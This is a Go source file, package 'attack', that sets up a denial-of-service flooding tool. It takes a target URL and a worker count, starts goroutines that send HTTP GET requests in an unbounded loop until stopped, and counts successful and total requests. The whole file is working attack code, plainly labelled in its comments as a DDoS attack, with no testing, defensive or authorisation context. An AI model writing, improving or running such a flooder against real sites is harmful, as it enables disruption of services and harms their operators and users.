package attack

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
)

// DDoS represents the structure for performing a Distributed Denial of Service (DDoS) attack.
type DDoS struct {
	url           string        // Target URL to attack
	stop          chan bool    // Channel to signal workers to stop
	amountWorkers int          // Number of concurrent workers to use for the attack

	// Statistics
	successRequest int64 // Number of successful requests made
	amountRequests int64 // Total number of requests made
}

// New initializes a new DDoS attack instance with the specified target URL and number of workers.
func New(URL string, workers int) (*DDoS, error) {
	// Ensure the number of workers is at least 1
	if workers < 1 {
		return nil, fmt.Errorf("number of workers must be at least 1")
	}
	
	// Parse and validate the URL
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("invalid URL or error = %v", err)
	}
	
	// Create a channel for stopping the attack
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          s,
		amountWorkers: workers,
	}, nil
}

// Run starts the DDoS attack using the configured number of workers.
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-d.stop: // If stop signal is received, exit the goroutine
					return
				default:
					// Perform an HTTP GET request to the target URL
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1) // Increment the total request count
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1) // Increment the successful request count
						_, _ = io.Copy(io.Discard, resp.Body) // Discard the response body to free resources
						_ = resp.Body.Close() // Close the response body
					}
				}
				runtime.Gosched() // Yield the processor to allow other goroutines to execute
			}
		}()
	}
}

// Stop signals all workers to stop their work and closes the stop channel.
func (d *DDoS) Stop() {
	close(d.stop) // Close the stop channel to signal workers to cease operations
}

// Result returns the statistics of the DDoS attack, including the number of successful and total requests.
func (d *DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
